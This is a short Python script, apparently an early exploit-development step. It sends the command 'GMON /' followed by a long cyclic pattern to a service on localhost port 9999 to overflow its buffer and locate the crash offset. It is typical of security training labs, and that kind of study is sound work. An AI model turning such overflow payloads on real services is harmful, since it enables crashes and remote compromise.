import socket
import os
import sys

target_command = "GMON /"
pattern = "Aa0Aa1Aa2Aa3Aa4Aa...(snip)...2Fg3Fg4Fg5Fg6Fg"        # 4103

payload = ""
payload += target_command
payload += pattern

print "[+] Sending buffer (Size: %d)" % len(payload)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))
print(s.recv(1024))
s.send(payload.encode('utf-8'))
s.close() 
